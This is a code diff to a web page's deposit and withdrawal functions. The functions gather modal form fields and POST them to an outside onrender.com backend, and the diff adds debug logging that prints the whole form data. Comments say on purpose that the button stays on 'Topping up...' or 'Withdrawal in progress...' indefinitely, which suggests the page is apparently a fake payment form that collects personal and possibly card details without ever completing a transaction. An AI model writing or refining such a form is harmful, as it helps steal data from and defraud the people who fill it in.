@@ -320,10 +320,12 @@
             });
 
             if (!allFilled) {
+                console.log('Validation failed: Not all fields are filled.');
                 alert('Please fill in all fields before submitting.');
                 return;
             }
 
+            console.log('All fields filled, proceeding with deposit...');
             btn.textContent = 'Topping up...';
             btn.disabled = true;
 
@@ -339,19 +341,30 @@
                 zipCode: document.querySelector('#deposit-modal [placeholder="Zip Code"]').value
             };
 
-            // Send data to backend and check for sleep status
-            const response = await fetch('https://pay-p5ev.onrender.com/api/deposit', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(formData)
-            });
+            console.log('Form data to be sent:', formData);
 
-            if (response.status === 503) {
-                alert('Transaction could not be processed, please try again.');
+            try {
+                console.log('Sending request to backend...');
+                const response = await fetch('https://pay-p5ev.onrender.com/api/deposit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                console.log('Response status:', response.status);
+                if (response.status === 503) {
+                    alert('Transaction could not be processed, please try again.');
+                } else if (response.status === 500) {
+                    console.log('Backend returned a 500 Internal Server Error.');
+                } else {
+                    console.log('Request completed with status:', response.status);
+                }
+            } catch (error) {
+                console.error('Fetch error:', error.message);
             }
-            // No other error handling or alerts, button stays as "Topping up..." indefinitely
+            // Button stays as "Topping up..." indefinitely
         }
 
         async function processWithdraw() {
@@ -367,10 +380,12 @@
             });
 
             if (!allFilled) {
+                console.log('Validation failed: Not all fields are filled.');
                 alert('Please fill in all fields before submitting.');
                 return;
             }
 
+            console.log('All fields filled, proceeding with withdrawal...');
             btn.textContent = 'Withdrawal in progress...';
             btn.disabled = true;
 
@@ -386,19 +401,30 @@
                 zipCode: document.querySelector('#withdraw-modal [placeholder="Zip Code"]').value
             };
 
-            // Send data to backend and check for sleep status
-            const response = await fetch('https://pay-p5ev.onrender.com/api/withdraw', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(formData)
-            });
+            console.log('Form data to be sent:', formData);
 
-            if (response.status === 503) {
-                alert('Transaction could not be processed, please try again.');
+            try {
+                console.log('Sending request to backend...');
+                const response = await fetch('https://pay-p5ev.onrender.com/api/withdraw', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                console.log('Response status:', response.status);
+                if (response.status === 503) {
+                    alert('Transaction could not be processed, please try again.');
+                } else if (response.status === 500) {
+                    console.log('Backend returned a 500 Internal Server Error.');
+                } else {
+                    console.log('Request completed with status:', response.status);
+                }
+            } catch (error) {
+                console.error('Fetch error:', error.message);
             }
-            // No other error handling or alerts, button stays as "Withdrawal in progress..." indefinitely
+            // Button stays as "Withdrawal in progress..." indefinitely
         }
 
         function startDrag(e, modalId) {
@@ -436,4 +462,4 @@
         }
     </script>
 </body>
-                </html>
+                            </html>
